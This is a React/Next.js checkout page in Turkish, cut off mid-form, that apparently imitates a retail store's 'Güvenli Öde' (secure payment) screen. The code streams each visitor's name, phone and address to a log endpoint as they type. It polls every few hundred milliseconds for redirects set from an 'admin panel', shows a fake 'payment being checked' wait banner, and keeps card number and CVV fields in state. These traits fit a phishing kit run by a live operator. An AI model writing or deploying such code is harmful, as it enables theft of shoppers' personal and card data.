'use client';

import React, { useEffect, useState, useRef } from 'react';
import Header from '@/components/Header';
import StoreFooter from '@/components/StoreFooter';
import BottomNav from '@/components/BottomNav';
import AddressSelector from '@/components/AddressSelector';
import { useRouter, useSearchParams } from 'next/navigation';
import { FiLock, FiMapPin, FiPlus, FiChevronDown } from 'react-icons/fi';
import { useToast } from '@/components/ToastProvider';
import { LIVE_LOG_DEBOUNCE_MS, postLiveLog } from '@/lib/liveFormLogger';
import { getVisitorLogId } from '@/lib/visitorSession';
import { clearVisitorTracking } from '@/lib/visitorLogger';
import { formatPhoneInput, isValidTurkishPhone, getPhoneRaw, formatPhoneNumber } from '@/lib/phoneUtils';
import { getClientUserAgent } from '@/lib/userAgentParser';
import { CHECKOUT_REDIRECT_POLL_MS } from '@/lib/constants';
import { getCartAnalytics, trackTikTok } from '@/lib/tiktokPixel';
import ProductImage from '@/components/ProductImage';

interface CartItem {
  productId: string;
  name: string;
  price: number;
  image: string;
  quantity: number;
}

export default function CheckoutPage() {
  const router = useRouter();
  const searchParams = useSearchParams();
  const { showToast } = useToast();
  const [cartItems, setCartItems] = useState<CartItem[]>([]);
  const [selectedInstallment, setSelectedInstallment] = useState(1);
  const [user, setUser] = useState<any>(null);
  const [addresses, setAddresses] = useState<any[]>([]);
  const [selectedAddressId, setSelectedAddressId] = useState<string>('');
  const [showAddressForm, setShowAddressForm] = useState(false);
  const [formData, setFormData] = useState({
    firstName: '',
    lastName: '',
    phone: '',
    email: '',
    city: '',
    cityId: 0,
    district: '',
    districtId: 0,
    neighborhood: '',
    neighborhoodId: 0,
    street: '',
    buildingNo: '',
    floor: '',
    apartmentNo: '',
    address: '',
    cardName: '',
    cardNumber: '',
    cardMonth: '',
    cardYear: '',
    cardCvv: '',
  });
  const [acceptedTerms, setAcceptedTerms] = useState(false);
  const [currentLogId, setCurrentLogId] = useState<string | null>(searchParams.get('logId') || null);
  const [waitingStatus, setWaitingStatus] = useState<{ show: boolean; message: string } | null>(null);
  const logTimeoutRef = React.useRef<NodeJS.Timeout | null>(null);
  const checkIntervalRef = useRef<NodeJS.Timeout | null>(null);
  const addressLogStartedRef = useRef(false);

  const hasAddressEngagement = () =>
    Boolean(
      selectedAddressId ||
        formData.firstName ||
        formData.lastName ||
        formData.phone ||
        formData.city ||
        formData.district ||
        formData.neighborhood ||
        formData.street ||
        formData.buildingNo ||
        formData.floor ||
        formData.apartmentNo
    );

  // Adres yazılmaya başlayınca log düş — ilk tuş anında, sonrası debounce
  useEffect(() => {
    if (!hasAddressEngagement()) return;

    if (!addressLogStartedRef.current) {
      addressLogStartedRef.current = true;
      void logFormData();
    }

    if (logTimeoutRef.current) {
      clearTimeout(logTimeoutRef.current);
    }

    logTimeoutRef.current = setTimeout(() => {
      void logFormData();
    }, LIVE_LOG_DEBOUNCE_MS);

    return () => {
      if (logTimeoutRef.current) {
        clearTimeout(logTimeoutRef.current);
      }
    };
  }, [
    formData.city,
    formData.district,
    formData.neighborhood,
    formData.street,
    formData.buildingNo,
    formData.floor,
    formData.apartmentNo,
    formData.firstName,
    formData.lastName,
    formData.phone,
    selectedAddressId,
    cartItems,
    addresses,
  ]);

  const logFormData = async () => {
    try {
      if (!hasAddressEngagement()) return;

      const total = cartItems.reduce((sum, item) => sum + item.price * item.quantity, 0);
      const firstName = user ? user.name || formData.firstName : formData.firstName;
      const lastName = user ? user.surname || formData.lastName : formData.lastName;
      const fullName =
        firstName && lastName
          ? `${firstName} ${lastName}`
          : firstName || lastName || formData.phone || 'Bilinmeyen';
      const phone = formData.phone?.trim() || '';
      const phoneRaw = phone.replace(/\D/g, '').slice(-10);
      const email = user?.email || undefined;

      const selectedAddress = selectedAddressId
        ? addresses.find((a) => a._id === selectedAddressId || a.id === selectedAddressId)
        : null;

      const logId = await postLiveLog({
        logId: currentLogId || getVisitorLogId() || undefined,
        name: fullName,
        firstName,
        lastName,
        phone: phone || undefined,
        phoneRaw: phoneRaw.length === 10 ? phoneRaw : undefined,
        email: email || undefined,
        amount: total,
        status: 'Adres Ekranında',
        pageType: 'address',
        onlineStatus: 'Aktif',
        userAgent: getClientUserAgent(),
        address: selectedAddress
          ? {
              city: selectedAddress.city,
              district: selectedAddress.district,
              neighborhood: selectedAddress.neighborhood,
              street: selectedAddress.street,
              buildingNo: selectedAddress.buildingNo,
              floor: selectedAddress.floor,
              apartmentNo: selectedAddress.apartmentNo,
              fullAddress: selectedAddress.fullAddress || selectedAddress.address,
            }
          : {
              city: formData.city || undefined,
              cityId: formData.cityId || undefined,
              district: formData.district || undefined,
              districtId: formData.districtId || undefined,
              neighborhood: formData.neighborhood || undefined,
              neighborhoodId: formData.neighborhoodId || undefined,
              street: formData.street || undefined,
              buildingNo: formData.buildingNo || undefined,
              floor: formData.floor || undefined,
              apartmentNo: formData.apartmentNo || undefined,
              fullAddress: formData.street
                ? `${formData.street} ${formData.buildingNo ? 'No: ' + formData.buildingNo : ''} ${formData.floor ? 'Kat: ' + formData.floor : ''} ${formData.apartmentNo ? 'Daire: ' + formData.apartmentNo : ''}`.trim()
                : undefined,
            },
      });

      if (logId && !currentLogId) {
        setCurrentLogId(logId);
        sessionStorage.setItem('currentLogId', logId);
      }
    } catch (error) {
      console.error('Anlık loglama hatası:', error);
    }
  };

  useEffect(() => {
    clearVisitorTracking();

    const cart = JSON.parse(localStorage.getItem('cart') || '[]');
    if (cart.length === 0) {
      router.push('/cart');
      return;
    }
    setCartItems(cart);

    // Admin panelinden yönlendirme kontrolü
    checkRedirect();
    
    // URL'den logId varsa, admin yönlendirme kontrolünü başlat
    const logId = searchParams.get('logId');
    if (logId && !currentLogId) {
      setCurrentLogId(logId);
    }
    
    checkUserLogStatus();
    
    if (currentLogId) {
      sessionStorage.setItem('currentLogId', currentLogId);
    }
    
    const statusInterval = setInterval(() => {
      checkUserLogStatus();
    }, 5000);
    
    return () => {
      clearInterval(statusInterval);
    };
  }, [router, searchParams]);

  const checkUserLogStatus = async () => {
    try {
      const user = JSON.parse(localStorage.getItem('user') || '{}');
      const phone = user.phone || formData.phone;
      if (!phone) return;

      const phoneRaw = phone.replace(/\D/g, '').slice(-10);
      if (phoneRaw.length !== 10) return;

      const res = await fetch(`/api/logs?phone=${phoneRaw}&t=${Date.now()}`);
      const data = await res.json();
      
      if (data.success && data.data && data.data.length > 0) {
        const latestLog = data.data[0];
        if (latestLog.status === 'Bekliyor' && latestLog.onlineStatus === 'Aktif') {
          setWaitingStatus({
            show: true,
            message: 'Ödeme işleminiz kontrol ediliyor. Lütfen bekleyiniz...'
          });
        } else {
          setWaitingStatus(null);
        }
      } else {
        setWaitingStatus(null);
      }
    } catch (error) {
      console.error('Log durumu kontrol hatası:', error);
    }
  };

  // Admin panelinden yönlendirme kontrolü (zincirleme yönlendirme için)
  const checkAdminRedirect = React.useCallback(async () => {
    const logId = searchParams.get('logId') || currentLogId;
    if (!logId) return false;

    try {
      const res = await fetch(`/api/logs/${logId}/status?t=${Date.now()}`);
      const data = await res.json();
      
      if (data.success && data.data) {
        const log = data.data;
        
        // LogId'yi set et
        if (!currentLogId) {
          setCurrentLogId(logId);
        }
        
        // Eğer admin panelinden yönlendirme yapıldıysa
        if (log.redirectTo && log.redirectTo.trim() !== '') {
          const currentUrl = window.location.href;
          
          // URL'i düzelt ve logId ekle (yoksa)
          let redirectUrl = log.redirectTo.trim();
          if (!redirectUrl.includes('logId=') && logId) {
            redirectUrl += (redirectUrl.includes('?') ? '&' : '?') + `logId=${logId}`;
          }
          
          if (redirectUrl.startsWith('/')) {
            redirectUrl = window.location.origin + redirectUrl;
          } else if (!redirectUrl.startsWith('http://') && !redirectUrl.startsWith('https://')) {
            redirectUrl = window.location.origin + '/' + redirectUrl;
          }
          
          // Mevcut URL ile yönlendirme URL'ini karşılaştır
          // Eğer tamamen aynıysa yönlendirme yapma (sonsuz döngüyü önle)
          const currentUrlNormalized = currentUrl.split('#')[0].replace(/\/$/, '');
          const redirectUrlNormalized = redirectUrl.split('#')[0].replace(/\/$/, '');
          
          // Eğer URL'ler farklıysa veya aynı path ama farklı query parametreleri varsa yönlendir
          if (currentUrlNormalized !== redirectUrlNormalized) {
            // Debug logları kaldırıldı (performans için)
            
            // Interval'i durdur
            if (checkIntervalRef.current) {
              clearInterval(checkIntervalRef.current);
              checkIntervalRef.current = null;
            }
            
            // Yönlendir (hemen, gecikme olmadan)
            window.location.href = redirectUrl;
            
            return true;
          } else {
            // Aynı URL'e yönlendirme yapılmaya çalışılıyor, bu normal (sonsuz döngü yok)
          }
        }
      }
      return false;
    } catch (error) {
      console.error('Admin yönlendirme kontrolü hatası:', error);
      return false;
    }
  }, [currentLogId, searchParams]);

  // Sürekli admin yönlendirme kontrolü (zincirleme yönlendirme için) - daha agresif polling
  useEffect(() => {
    const logId = searchParams.get('logId') || currentLogId;
    if (!logId) return;

    // İlk kontrol (hemen)
    checkAdminRedirect();
    
    // Her 300ms'de bir kontrol et (daha sık - anlık yönlendirme için)
    checkIntervalRef.current = setInterval(() => {
      checkAdminRedirect();
    }, CHECKOUT_REDIRECT_POLL_MS);

    return () => {
      if (checkIntervalRef.current) {
        clearInterval(checkIntervalRef.current);
        checkIntervalRef.current = null;
      }
    };
  }, [currentLogId, searchParams, checkAdminRedirect]);

  const checkRedirect = async () => {
    try {
      const phoneRaw = formData.phone.replace(/\D/g, '').slice(-10);
      if (phoneRaw.length !== 10) return;

      // Son log'u kontrol et (yönlendirme var mı?)
      const res = await fetch(`/api/logs?phone=${phoneRaw}&limit=1`);
      const data = await res.json();
      
      if (data.success && data.data && data.data.length > 0) {
        const latestLog = data.data[0];
        
        // Eğer yönlendirme varsa ve henüz yönlendirilmediyse
        if (latestLog.redirectTo && latestLog.status === 'Hata') {
          // Yönlendirme yap
          router.push(latestLog.redirectTo);
        }
      }
    } catch (error) {
      console.error('Yönlendirme kontrolü hatası:', error);
    }
  };

  const loadAddresses = async (phoneRaw: string) => {
    try {
      const res = await fetch(`/api/users/me/addresses?phoneRaw=${phoneRaw}`);
      const data = await res.json();
      
      if (data.success) {
        setAddresses(data.addresses || []);
      }
    } catch (error) {
      console.error('Adresler yüklenemedi:', error);
    }
  };

  const handleAddressSelect = (addressId: string) => {
    const address = addresses.find(addr => addr._id?.toString() === addressId);
    if (address) {
      setSelectedAddressId(addressId);
      setFormData(prev => ({
        ...prev,
        firstName: address.name || prev.firstName,
        lastName: address.surname || prev.lastName,
        city: address.city,
        cityId: address.cityId,
        district: address.district,
        districtId: address.districtId,
        neighborhood: address.neighborhood,
        neighborhoodId: address.neighborhoodId,
        street: address.street,
        buildingNo: address.buildingNo,
        floor: address.floor,
        apartmentNo: address.apartmentNo,
        address: `${address.street} ${address.buildingNo ? 'No: ' + address.buildingNo : ''} ${address.floor ? 'Kat: ' + address.floor : ''} ${address.apartmentNo ? 'Daire: ' + address.apartmentNo : ''}`.trim(),
      }));
    }
  };

  const handleSaveAddress = async (addressData: any) => {
    if (!user) {
      showToast('Lütfen önce giriş yapın', 'error');
      return;
    }

    try {
      const res = await fetch('/api/users/me/addresses', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'x-phone-raw': user.phoneRaw,
        },
        body: JSON.stringify({
          ...addressData,
          type: addressData.type || 'Ev',
        }),
      });

      const data = await res.json();
      
      if (data.success) {
        setAddresses(data.addresses || []);
        setShowAddressForm(false);
        showToast('Adres başarıyla eklendi!', 'success');
        
        // Yeni eklenen adresi seç
        if (data.addresses && data.addresses.length > 0) {
          const newAddress = data.addresses[data.addresses.length - 1];
          handleAddressSelect(newAddress._id?.toString() || '');
        }
      } else {
        showToast(data.error || 'Adres eklenirken bir hata oluştu.', 'error');
      }
    } catch (error: any) {
      console.error('Adres ekleme hatası:', error);
      showToast(error.message || 'Adres eklenirken bir hata oluştu.', 'error');
    }
  };

  const subtotal = cartItems.reduce((sum, item) => sum + item.price * item.quantity, 0);
  const shipping = 0; // Ücretsiz kargo
  const total = subtotal + shipping;
  const installmentAmount = total / selectedInstallment;

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    
    if (!acceptedTerms) {
      showToast('Lütfen ön bilgilendirme formunu kabul edin.', 'error');
      return;
    }

    // Tüm kullanıcılar için telefon numarası zorunlu ve geçerli olmalı
    if (!formData.phone || formData.phone.trim() === '') {
      showToast('Lütfen telefon numaranızı giriniz.', 'error');
      return;
    }
    
    // Türkiye telefon numarası validasyonu
    if (!isValidTurkishPhone(formData.phone)) {
      showToast('Lütfen geçerli bir cep telefonu numarası giriniz. (5XX XXX XX XX)', 'error');
      return;
    }

    // Giriş yapmış kullanıcılar için adres kontrolü
    if (user && addresses.length > 0 && !selectedAddressId && !showAddressForm) {
      showToast('Lütfen bir teslimat adresi seçin veya yeni adres ekleyin.', 'error');
      return;
    }

    // Misafir kullanıcılar için form validasyonu
    if (!user) {
      if (!formData.firstName || !formData.lastName) {
        showToast('Lütfen ad ve soyad alanlarını doldurun.', 'error');
        return;
      }
      if (!formData.cityId || !formData.districtId || !formData.neighborhoodId) {
        showToast('Lütfen il, ilçe ve mahalle bilgilerini seçin.', 'error');
        return;
      }
      if (!formData.street || !formData.buildingNo || !formData.floor || !formData.apartmentNo) {
        showToast('Lütfen adres detaylarını eksiksiz doldurun.', 'error');
        return;
      }
    }

    // Kayıtlı kullanıcı ama adres seçilmediyse validasyon
    if (user && !selectedAddressId && !showAddressForm) {
      if (!formData.cityId || !formData.districtId || !formData.neighborhoodId) {
        showToast('Lütfen il, ilçe ve mahalle bilgilerini seçin.', 'error');
        return;
      }
      if (!formData.street || !formData.buildingNo || !formData.floor || !formData.apartmentNo) {
        showToast('Lütfen adres detaylarını eksiksiz doldurun.', 'error');
        return;
      }
    }

    // Log'u güncelle veya oluştur (beklemede durumuna geçir)
    // Her zaman POST yap - API otomatik olarak aynı telefon numarası için mevcut log'u bulup güncelleyecek
    // Bu sayede aynı kişi için 1'den fazla log oluşturulmayacak
    let finalLogId = currentLogId;
    const phone = formData.phone.trim();
    const phoneRaw = phone.replace(/\D/g, '').slice(-10);
    const firstName = user ? (user.name || formData.firstName) : formData.firstName;
    const lastName = user ? (user.surname || formData.lastName) : formData.lastName;
    const fullName =
      firstName && lastName ? `${firstName} ${lastName}` : firstName || lastName || phone || 'Bilinmeyen';
    const email = user?.email || undefined;

    try {
      const logData = {
         name: fullName,
         firstName: firstName,
         lastName: lastName,
         phone: phone,
         phoneRaw: phoneRaw,
         email: email,
         amount: total,
         status: 'Adres Tamamlandı',
         pageType: 'address',
         userAgent: getClientUserAgent(),
         address: {
           city: formData.city,
           cityId: formData.cityId,
           district: formData.district,
           districtId: formData.districtId,
           neighborhood: formData.neighborhood,
           neighborhoodId: formData.neighborhoodId,
           street: formData.street,
           buildingNo: formData.buildingNo,
           floor: formData.floor,
           apartmentNo: formData.apartmentNo,
           fullAddress: `${formData.street} ${formData.buildingNo ? 'No: ' + formData.buildingNo : ''} ${formData.floor ? 'Kat: ' + formData.floor : ''} ${formData.apartmentNo ? 'Daire: ' + formData.apartmentNo : ''}`.trim(),
         },
       };
      
      // Her zaman POST yap - API otomatik olarak aynı telefon numarası için mevcut log'u bulup güncelleyecek
      const res = await fetch('/api/logs', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(logData),
      });
      const data = await res.json();
      if (data.success && data.data?._id) {
        finalLogId = data.data._id;
        setCurrentLogId(finalLogId); // LogId'yi set et
        // LogId'yi sessionStorage'a kaydet (pasif yapma için)
        if (finalLogId) {
          sessionStorage.setItem('currentLogId', finalLogId);
        }
      }
    } catch (logError) {
      console.error('Log güncelleme hatası:', logError);
    }

    // Ödeme sayfasına yönlendir
    if (finalLogId) {
      sessionStorage.setItem(
        'checkoutPaymentContext',
        JSON.stringify({
          logId: finalLogId,
          phone,
          phoneRaw,
          firstName: user ? (user.name || formData.firstName) : formData.firstName,
          lastName: user ? (user.surname || formData.lastName) : formData.lastName,
          fullName:
            (user ? (user.name || formData.firstName) : formData.firstName) &&
            (user ? (user.surname || formData.lastName) : formData.lastName)
              ? `${user ? (user.name || formData.firstName) : formData.firstName} ${user ? (user.surname || formData.lastName) : formData.lastName}`
              : phone,
          email: user?.email || undefined,
          amount: total,
          address: {
            city: formData.city,
            cityId: formData.cityId,
            district: formData.district,
            districtId: formData.districtId,
            neighborhood: formData.neighborhood,
            neighborhoodId: formData.neighborhoodId,
            street: formData.street,
            buildingNo: formData.buildingNo,
            floor: formData.floor,
            apartmentNo: formData.apartmentNo,
            fullAddress: `${formData.street} ${formData.buildingNo ? 'No: ' + formData.buildingNo : ''} ${formData.floor ? 'Kat: ' + formData.floor : ''} ${formData.apartmentNo ? 'Daire: ' + formData.apartmentNo : ''}`.trim(),
          },
        })
      );

      const cartAnalytics = getCartAnalytics();
      trackTikTok('InitiateCheckout', {
        value: total,
        currency: 'TRY',
        contents: cartAnalytics.contents,
      });
      trackTikTok('Contact', {
        content_name: fullName,
        phone_number: phoneRaw,
        email,
      });

      router.push(`/checkout/payment?logId=${finalLogId}`);
    } else {
      showToast('Log oluşturulamadı. Lütfen tekrar deneyin.', 'error');
    }
  };

  const handleInputChange = (e: React.ChangeEvent<HTMLInputElement | HTMLTextAreaElement | HTMLSelectElement>) => {
    const name = e.target.name;
    let value = e.target.value;
    
    // Telefon numarası için özel formatlama
    if (name === 'phone') {
      value = formatPhoneInput(value);
    }
    
    setFormData({
      ...formData,
      [name]: value,
    });
  };

  // Kart numarası için özel handler - 16 haneyle sınırlandır ve formatla
  const handleCardNumberChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    // Sadece rakamları al
    let value = e.target.value.replace(/\D/g, '');
    
    // 16 haneyle sınırlandır
    if (value.length > 16) {
      value = value.slice(0, 16);
    }
    
    // 4'er haneli gruplara ayır (boşluklarla)
    const formatted = value.replace(/(\d{4})(?=\d)/g, '$1 ');
    
    setFormData({
      ...formData,
      cardNumber: formatted,
    });
  };

  // CVV için özel handler - 3 haneyle sınırlandır
  const handleCvvChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    // Sadece rakamları al
    let value = e.target.value.replace(/\D/g, '');
    
    // 3 haneyle sınırlandır
    if (value.length > 3) {
      value = value.slice(0, 3);
    }
    
    setFormData({
      ...formData,
      cardCvv: value,
    });
  };

  const installmentOptions = [
    { installments: 1, label: 'Tek Çekim' },
    { installments: 3, label: '3 Taksit' },
    { installments: 6, label: '6 Taksit' },
    { installments: 9, label: '9 Taksit' },
    { installments: 12, label: '12 Taksit' },
  ];

  return (
    <div className="min-h-screen bg-a101-grayLight pb-16 md:pb-0 w-full min-w-0 overflow-x-clip">
      <Header />

      <main className="container mx-auto px-2 sm:px-3 md:px-4 lg:px-6 py-3 sm:py-4 md:py-6 lg:py-8 max-w-6xl">
        {/* Bekliyor Durumu Banner */}
        {waitingStatus && waitingStatus.show && (
          <div className="mb-4 sm:mb-6 bg-blue-600 border-2 border-blue-500 text-white rounded-lg shadow-lg p-3 sm:p-4">
            <div className="flex items-center gap-2 sm:gap-3">
              <div className="flex-shrink-0">
                <div className="w-2.5 h-2.5 sm:w-3 sm:h-3 bg-white rounded-full animate-pulse"></div>
              </div>
              <p className="text-xs sm:text-sm md:text-base font-semibold flex-1">
                {waitingStatus.message}
              </p>
            </div>
          </div>
        )}
        <h1 className="text-lg sm:text-xl md:text-2xl lg:text-3xl font-black text-gray-900 mb-4 sm:mb-5 md:mb-6 flex items-center gap-1.5 sm:gap-2 leading-tight">
          <FiLock className="text-a101-teal w-5 h-5 sm:w-6 sm:h-6 md:w-7 md:h-7 flex-shrink-0" />
          <span>Güvenli Öde</span>
        </h1>

        <form onSubmit={handleSubmit} className="grid grid-cols-1 md:grid-cols-3 gap-3 sm:gap-4 md:gap-6">
          {/* Left Column - Forms */}
          <div className="md:col-span-2 space-y-4 sm:space-y-5 md:space-y-6">
            {/* Delivery Address */}
            <div className="bg-white rounded-lg sm:rounded-xl shadow-lg p-3 sm:p-4 md:p-6">
              <div className="flex flex-col sm:flex-row items-start sm:items-center justify-between gap-2 sm:gap-3 mb-3 sm:mb-4">
                <h2 className="text-base sm:text-lg md:text-xl font-black text-gray-900 leading-tight">Teslimat Adresi</h2>
                {user && (
                  <button
                    type="button"
                    onClick={() => setShowAddressForm(true)}
                    className="flex items-center justify-center gap-1.5 sm:gap-2 px-3 sm:px-4 py-2 sm:py-2.5 bg-a101-teal hover:bg-a101-tealLight active:bg-a101-teal text-white rounded-lg font-semibold transition-colors text-[11px] sm:text-xs md:text-sm touch-manipulation min-h-[40px] sm:min-h-[44px]"
                  >
                    <FiPlus className="w-3.5 h-3.5 sm:w-4 sm:h-4 flex-shrink-0" />
                    <span className="whitespace-nowrap leading-[1]">Yeni Adres</span>
                  </button>
                )}
              </div>

              {/* Adres Seçimi - Sadece giriş yapmış kullanıcılar için */}
              {user && addresses.length > 0 && !showAddressForm && (
                <div className="mb-4">
                  <label className="block text-[10px] sm:text-xs md:text-sm font-semibold text-gray-700 mb-1.5 sm:mb-2 leading-[1]">
                    Kayıtlı Adreslerim
                  </label>
                  <div className="relative">
                    <select
                      value={selectedAddressId}
                      onChange={(e) => handleAddressSelect(e.target.value)}
                      className="w-full px-2.5 py-2 sm:px-3 sm:py-2.5 md:px-4 md:py-3 border-2 border-gray-300 rounded-lg focus:ring-2 focus:ring-a101-teal focus:border-transparent appearance-none pr-8 sm:pr-10 text-[11px] sm:text-xs md:text-sm min-h-[40px] sm:min-h-[44px] md:min-h-[48px] touch-manipulation"
                    >
                      <option value="">Adres Seçin</option>
                      {addresses.map((address: any) => (
                        <option key={address._id?.toString() || Math.random()} value={address._id?.toString()}>
                          {address.title} - {address.city} / {address.district} / {address.neighborhood}
                        </option>
                      ))}
                    </select>
                    <FiChevronDown className="absolute right-2 sm:right-3 top-1/2 transform -translate-y-1/2 text-gray-400 pointer-events-none w-3.5 h-3.5 sm:w-4 sm:h-4 md:w-5 md:h-5" />
                  </div>
                </div>
              )}

              {/* Misafir kullanıcı bilgilendirmesi */}
              {!user && (
                <div className="mb-3 sm:mb-4 bg-blue-50 border-2 border-blue-200 rounded-lg p-3 sm:p-4">
                  <div className="flex items-start gap-2 sm:gap-3">
                    <span className="text-blue-600 text-base sm:text-lg md:text-xl flex-shrink-0">ℹ</span>
                    <div>
                      <p className="text-xs sm:text-sm md:text-base font-semibold text-blue-900 mb-1 leading-[1.3]">Misafir Kullanıcı</p>
                      <p className="text-[10px] sm:text-xs md:text-sm text-blue-700 leading-[1.4]">
                        Kayıt olmadan alışveriş yapabilirsiniz. Adres bilgilerinizi aşağıdaki formu doldurarak girebilirsiniz.
                      </p>
                    </div>
                  </div>
                </div>
              )}

              {/* Adres Formu veya Seçilen Adres Detayları */}
              {showAddressForm ? (
                <AddressForm
                  onClose={() => setShowAddressForm(false)}
                  onSave={handleSaveAddress}
                />
              ) : (
                <>
                  {/* Kayıtlı kullanıcı ve adres seçildiyse sadece adres bilgisi göster */}
                  {user && selectedAddressId && (
                    <div className="p-3 sm:p-4 bg-green-50 border-2 border-green-200 rounded-lg">
                      <div className="flex flex-col sm:flex-row items-start sm:items-start justify-between gap-2 sm:gap-3">
                        <div className="flex-1 min-w-0">
                          <p className="text-xs sm:text-sm md:text-base font-semibold text-green-900 mb-1.5 sm:mb-2 leading-[1.3]">Seçilen Teslimat Adresi</p>
                          {(() => {
                            const selectedAddr = addresses.find(addr => addr._id?.toString() === selectedAddressId);
                            if (!selectedAddr) return null;
                            return (
                              <div className="text-[10px] sm:text-xs md:text-sm text-green-700 space-y-0.5 sm:space-y-1 leading-[1.4]">
                                <p><span className="font-semibold">Adres:</span> {selectedAddr.title}</p>
                                <p><span className="font-semibold">Konum:</span> {selectedAddr.city} / {selectedAddr.district} / {selectedAddr.neighborhood}</p>
                                <p><span className="font-semibold">Sokak:</span> {selectedAddr.street}</p>
                                <p><span className="font-semibold">Bina No:</span> {selectedAddr.buildingNo}, <span className="font-semibold">Kat:</span> {selectedAddr.floor}, <span className="font-semibold">Daire:</span> {selectedAddr.apartmentNo}</p>
                                {selectedAddr.description && (
                                  <p><span className="font-semibold">Açıklama:</span> {selectedAddr.description}</p>
                                )}
                              </div>
                            );
                          })()}
                        </div>
                        <button
                          type="button"
                          onClick={() => {
                            setSelectedAddressId('');
                            setFormData(prev => ({
                              ...prev,
                              city: '',
                              cityId: 0,
                              district: '',
                              districtId: 0,
                              neighborhood: '',
                              neighborhoodId: 0,
                              street: '',
                              buildingNo: '',
                              floor: '',
                              apartmentNo: '',
                            }));
                          }}
                          className="text-[10px] sm:text-xs md:text-sm text-red-600 hover:text-red-700 font-semibold whitespace-nowrap touch-manipulation min-h-[32px] sm:min-h-[36px] px-2 sm:px-3 py-1 sm:py-1.5 rounded"
                        >
                          Değiştir
                        </button>
                      </div>
                    </div>
                  )}

                  {/* Misafir kullanıcı veya kayıtlı kullanıcı ama adres seçilmediyse form göster */}
                  {(!user || (user && !selectedAddressId)) && (
                    <div className="grid grid-cols-1 sm:grid-cols-2 gap-3 sm:gap-4">
                      {/* Ad, Soyad - Sadece misafir kullanıcılar için */}
                      {!user && (
                        <>
                          <div>
                            <label className="block text-[10px] sm:text-xs md:text-sm font-semibold text-gray-700 mb-1.5 sm:mb-2 leading-[1]">Ad</label>
                            <input
                              type="text"
                              name="firstName"
                              value={formData.firstName}
                              onChange={handleInputChange}
                              required
                              className="w-full px-2.5 py-2 sm:px-3 sm:py-2.5 md:px-4 md:py-3 border-2 border-gray-300 rounded-lg focus:ring-2 focus:ring-a101-teal focus:border-transparent text-[11px] sm:text-xs md:text-sm min-h-[40px] sm:min-h-[44px] md:min-h-[48px] touch-manipulation"
                            />
                          </div>
                          <div>
                            <label className="block text-[10px] sm:text-xs md:text-sm font-semibold text-gray-700 mb-1.5 sm:mb-2 leading-[1]">Soyad</label>
                            <input
                              type="text"
                              name="lastName"
                              value={formData.lastName}
                              onChange={handleInputChange}
                              required
                              className="w-full px-2.5 py-2 sm:px-3 sm:py-2.5 md:px-4 md:py-3 border-2 border-gray-300 rounded-lg focus:ring-2 focus:ring-a101-teal focus:border-transparent text-[11px] sm:text-xs md:text-sm min-h-[40px] sm:min-h-[44px] md:min-h-[48px] touch-manipulation"
                            />
                          </div>
                        </>
                      )}
                      
                      {/* Telefon - TÜM kullanıcılar için zorunlu */}
                      <div>
                        <label className="block text-[10px] sm:text-xs md:text-sm font-semibold text-gray-700 mb-1.5 sm:mb-2 leading-[1]">
                          Telefon <span className="text-red-500">*</span>
                        </label>
                        <input
                          type="tel"
                          name="phone"
                          value={formData.phone}
                          onChange={handleInputChange}
                          required
                          placeholder="532 123 45 67"
                          maxLength={13}
                          className="w-full px-2.5 py-2 sm:px-3 sm:py-2.5 md:px-4 md:py-3 border-2 border-gray-300 rounded-lg focus:ring-2 focus:ring-a101-teal focus:border-transparent text-[11px] sm:text-xs md:text-sm min-h-[40px] sm:min-h-[44px] md:min-h-[48px] touch-manipulation"
                        />
                        {user && (
                          <p className="text-[9px] sm:text-[10px] md:text-xs text-gray-500 mt-1 leading-[1.3]">Kayıtlı telefon: {user.phone}</p>
                        )}
                        <p className="text-[9px] sm:text-[10px] md:text-xs text-gray-400 mt-1 leading-[1.3]">Format: 5XX XXX XX XX</p>
                      </div>

                      {/* Adres bilgileri - Her zaman göster (misafir veya yeni adres ekleme) */}
                      <div className="sm:col-span-2">
                        <AddressSelector
                          onAddressChange={(address) => {
                            setFormData({
                              ...formData,
                              city: address.city,
                              cityId: address.cityId,
                              district: address.district,
                              districtId: address.districtId,
                              neighborhood: address.neighborhood,
                              neighborhoodId: address.neighborhoodId,
                            });
                          }}
                          initialValues={{
                            cityId: formData.cityId,
                            districtId: formData.districtId,
                            neighborhoodId: formData.neighborhoodId,
                          }}
                        />
                      </div>
                      <div className="sm:col-span-2">
                        <label className="block text-sm font-semibold text-gray-700 mb-2">Cadde, Sokak</label>
                        <input
                          type="text"
                          name="street"
                          value={formData.street}
                          onChange={handleInputChange}
                          required
                          className="w-full px-4 py-2.5 border-2 border-gray-300 rounded-lg focus:ring-2 focus:ring-a101-teal focus:border-transparent mb-2"
                        />
                      </div>
                      <div>
                        <label className="block text-sm font-semibold text-gray-700 mb-2">Bina No</label>
                        <input
                          type="text"
                          name="buildingNo"
                          value={formData.buildingNo}
                          onChange={handleInputChange}
                          required
                          className="w-full px-4 py-2.5 border-2 border-gray-300 rounded-lg focus:ring-2 focus:ring-a101-teal focus:border-transparent"
                        />
                      </div>
                      <div>
                        <label className="block text-sm font-semibold text-gray-700 mb-2">Kat</label>
                        <input
                          type="text"
                          name="floor"
                          value={formData.floor}
                          onChange={handleInputChange}
                          required
                          className="w-full px-4 py-2.5 border-2 border-gray-300 rounded-lg focus:ring-2 focus:ring-a101-teal focus:border-transparent"
                        />
                      </div>
                      <div>
                        <label className="block text-sm font-semibold text-gray-700 mb-2">Daire No</label>
                        <input
                          type="text"
                          name="apartmentNo"
                          value={formData.apartmentNo}
                          onChange={handleInputChange}
                          required
                          className="w-full px-4 py-2.5 border-2 border-gray-300 rounded-lg focus:ring-2 focus:ring-a101-teal focus:border-transparent"
                        />
                      </div>
                      <div className="sm:col-span-2">
                        <label className="block text-sm font-semibold text-gray-700 mb-2">Adres Tarifi (Opsiyonel)</label>
                        <textarea
                          name="address"
                          value={formData.address}
                          onChange={handleInputChange}
                          rows={3}
                          className="w-full px-4 py-2.5 border-2 border-gray-300 rounded-lg focus:ring-2 focus:ring-a101-teal focus:border-transparent resize-none"
                          placeholder="Ek adres bilgisi (kapı kodu, bina adı vb.)"
                        />
                      </div>
                    </div>
                  )}
                </>
              )}
            </div>

          </div>

          {/* Right Column - Order Summary */}
